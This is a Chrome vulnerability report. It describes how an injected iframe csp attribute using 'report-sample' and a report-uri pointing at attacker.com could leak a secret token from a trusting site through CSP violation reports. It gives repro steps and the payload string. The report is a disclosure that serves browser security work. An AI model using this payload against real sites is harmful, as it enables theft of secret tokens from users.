@@ -1,0 +1,24 @@
+UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36
+
+Steps to reproduce the problem:
+1. Go to https://test.shhnjk.com/embenf.html
+2. Violation report including secret token is leaked to attacker's URL
+
+What is the expected behavior?
+Maybe disallow report-uri or script-sample in iframe's csp attribute?
+
+What went wrong?
+Scenario:
+https://vuln.shhnjk.com trusts https://test.shhnjk.com. So https://vuln.shhnjk.com/allowcsp.php has "Allow-CSP-From: https://test.shhnjk.com" header set.
+
+Now attacker found HTML injection in https://test.shhnjk.com. So he/she injected iframe with csp attribute "script-src 'sha256-test' 'report-sample'; report-uri https://attacker.com".
+
+Because attacker injected 'report-sample' and 'report-uri', attacker gets secret token in the script of https://vuln.shhnjk.com/allowcsp.php.
+
+Did this work before? N/A
+
+Chrome version: 61.0.3128.0  Channel: canary
+OS Version: OS X 10.12.5
+Flash Version:
+
+Let me know if this is acceptable risk in Embedded Enforcement. Then I'll blog about it.
